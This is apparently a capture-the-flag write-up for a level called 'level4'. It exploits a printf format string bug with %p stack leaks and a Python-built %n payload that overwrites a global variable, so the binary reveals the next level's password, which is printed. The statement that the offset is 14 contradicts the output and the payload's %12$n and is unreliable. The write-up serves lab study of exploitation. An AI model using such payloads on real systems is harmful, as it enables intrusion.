In this level, the program contains a call to the fgets function, which is protected against buffer overflow:
```
=> 0x804847a <n+35>:	call   0x8048350 <fgets@plt>
```
We can see a call to printf with the user input as the string argument:
```
=> 0x8048450 <p+12>:	call   0x8048340 <printf@plt>
```
The program makes a comparison with an uninitialized variable:
```
0x804848d <n+54>:	mov    eax,ds:0x8049810
=> 0x8048492 <n+59>:	cmp    eax,0x1025544
```
If this check succeeds, the .pass file is printed using the system call:
```
system("/bin/cat /home/user/level5/.pass")
```
To exploit the program, we will use a Format String Attack.
We need to modify the variable located at `0x08049810`.
```
./level4
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0xb7ff26b0 0xbffff764 0xb7fd0ff4 (nil) (nil) 0xbffff728 0x804848d 0xbffff520 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```
The offset is 14. Now we construct the payload for exploitation:
```
$> python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/payload
$> cat /tmp/payload - | ./level4
```
Running the payload should overwrite the variable and trigger the system call with the desired argument, revealing the content of the .pass file:
```
$ cat /home/user/level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```